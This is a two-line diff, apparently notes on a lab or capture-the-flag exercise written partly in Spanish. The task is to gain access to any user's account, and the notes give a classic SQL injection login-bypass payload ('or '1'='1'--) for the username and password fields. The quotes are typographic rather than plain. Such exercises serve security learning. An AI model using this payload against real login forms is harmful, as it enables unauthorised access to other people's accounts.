@@ -1,0 +1,2 @@
+Enunciado: Gain access to any users account
+Se realiza SQLI inyección  Username: ‘or ‘1’=’1’--  Password=‘or ‘1’=’1 ‘ –
